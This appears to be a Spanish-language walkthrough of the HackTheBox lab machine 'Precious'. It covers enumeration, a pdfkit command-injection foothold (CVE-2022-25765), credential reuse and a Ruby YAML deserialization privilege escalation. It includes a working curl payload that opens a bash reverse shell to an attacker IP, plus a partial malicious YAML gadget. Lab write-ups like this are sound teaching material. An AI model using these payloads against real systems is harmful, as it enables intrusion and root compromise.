# Precious

**Plataforma:** HackTheBox · **Dificultad:** Easy · **SO:** Linux

Máquina centrada en una vulnerabilidad de deserialización en Ruby y una
escalada de privilegios a través de credenciales reutilizadas.

## Enumeración

Escaneo inicial de puertos:

```bash
nmap -sC -sV -oA nmap/precious 10.10.11.x
```

```
22/tcp open  ssh     OpenSSH 8.4p1
80/tcp open  http    nginx 1.18.0
```

El puerto 80 aloja un servicio que convierte una URL en un PDF. Interceptando la
petición vemos que usa `pdfkit`, una gema de Ruby con una versión vulnerable.

## Foothold

`pdfkit` 0.8.6 es vulnerable a inyección de comandos (CVE-2022-25765) a través
del parámetro de URL:

```bash
curl -X POST http://10.10.11.x/ \
  --data-urlencode 'url=http://x/?name=%20`bash -c "bash -i >& /dev/tcp/10.10.14.x/4444 0>&1"`'
```

Recibimos la shell como el usuario `ruby`:

```
$ id
uid=1001(ruby) gid=1001(ruby) groups=1001(ruby)
```

## Movimiento lateral

En `~/.bundle/config` encontramos credenciales en texto plano:

```
BUNDLE_HTTPS://RUBYGEMS__ORG/: "henry:Q3********"
```

Reutilizamos la contraseña para saltar al usuario `henry` por SSH.

## Escalada de privilegios

`sudo -l` revela que `henry` puede ejecutar un script Ruby como root:

```
(root) NOPASSWD: /usr/bin/ruby /opt/update_dependencies.rb
```

El script carga un `dependencies.yml` con `YAML.load`, vulnerable a
deserialización insegura. Creamos un YAML malicioso en el directorio de trabajo:

```yaml
---
- !ruby/object:Gem::Installer
    i: x
- !ruby/object:Gem::SpecFetcher
    i: y
# ... gadget que ejecuta id > /tmp/pwned
```

Al ejecutar el script con `sudo`, el gadget corre como root.

## Root

```
$ sudo /usr/bin/ruby /opt/update_dependencies.rb
$ cat /root/root.txt
```

## Aprendizajes

- Revisar siempre las versiones de dependencias contra CVEs conocidos.
- Las credenciales en archivos de configuración son un vector recurrente.
- `YAML.load` sin `safe_load` es deserialización insegura de manual.
